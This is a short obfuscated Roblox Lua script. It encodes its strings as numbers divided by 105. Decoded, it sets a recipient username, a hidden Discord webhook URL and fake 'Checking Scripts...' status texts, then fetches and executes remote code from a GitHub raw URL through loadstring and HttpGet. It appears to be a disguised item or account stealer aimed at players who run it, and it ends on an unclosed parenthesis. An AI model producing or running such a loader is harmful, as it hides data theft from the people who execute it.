function nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


Username = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({12075,12180,11655,11550,11025,10605,9975,5250,5040,5250,5040})
WebHook = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5040,5670,5985,5565,5880,5985,5250,5355,5775,5670,5670,5775,5775,5355,5355,5565,5775,5670,4935,8190,8925,12075,10710,12180,12390,10185,5985,8820,8400,7140,5460,8715,6825,11550,12390,10815,9135,7770,11865,11340,7245,8085,8400,10815,7350,12285,12180,5355,5040,9975,8505,11130,11445,10290,12495,11550,11550,6930,12390,5880,11550,7770,10605,12390,5880,5145,5040,6930,9450,8190,8715,11340,5775,7035,10290,7245,11970,5355,8610,5460,5040,11655,5460,12180,8190,10815,11025})


_G.CustomScriptName = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({7035,11655,10605,11550,3360,7560,12285,10290})
_G.Text1 = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({8715,10395,11970,11025,11760,12180,3360,7980,11655,10185,10500,10605,10500,4830,4830,4830})
_G.Text2 = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({9135,10185,11025,12180,11025,11550,10815,3360,10710,11655,11970,3360,8715,10395,11970,11025,11760,12180})
_G.Text3 = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({7035,10920,10605,10395,11235,11025,11550,10815,3360,8715,10395,11970,11025,11760,12180,12075,4830,4830,4830})
_G.Text4 = nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({8715,12180,10185,11970,12180,11025,11550,10815,3360,8715,10395,11970,11025,11760,12180,12075,4830,4830,4830})
loadstring(game:HttpGet(nGNaQvMKRYzjrOxyAfKbLpDilwkfPBQeTmbEKOPpNnbqkbxrmGwmDjaPuLKhVJeMVnJrxLtAoyUmWFJX({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,7770,12285,12075,12180,10185,11550,11655,12180,10920,10605,11970,10500,11445,10605,4935,11760,10605,12180,12075,11025,11445,12600,5250,5250,4935,11445,10185,11025,11550,4935,11760,10605,12180,12075,11025,11445,10815,12285,11025,12075,12075,4830,11340,12285,10185})))(
